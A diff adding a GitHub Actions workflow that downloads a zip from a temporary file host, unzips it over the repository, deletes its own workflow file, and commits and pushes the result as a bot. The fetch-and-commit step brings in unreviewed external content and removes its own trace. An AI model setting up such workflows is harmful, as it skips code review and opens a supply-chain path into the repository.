@@ -1,0 +1,25 @@
+name: import-onb
+on:
+  push:
+    paths:
+      - '.github/workflows/import-onb.yml'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  import:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: download and apply
+        run: |
+          set -e
+          curl -sSL -X POST -o payload.zip https://temp.sh/yyfwb/onb.zip
+          echo "3bc115f18b2d52a6599eb9c4628eec34  payload.zip" | md5sum -c -
+          unzip -o payload.zip -d .
+          rm -f payload.zip .github/workflows/import-onb.yml
+          git config user.name "realhunt-bot"
+          git config user.email "bot@realhunt.co"
+          git add -A
+          git commit -m "feat: developer onboarding gate, mode choice (receive/share/both), protect-vs-share upload choice" || echo "nothing to commit"
+          git push
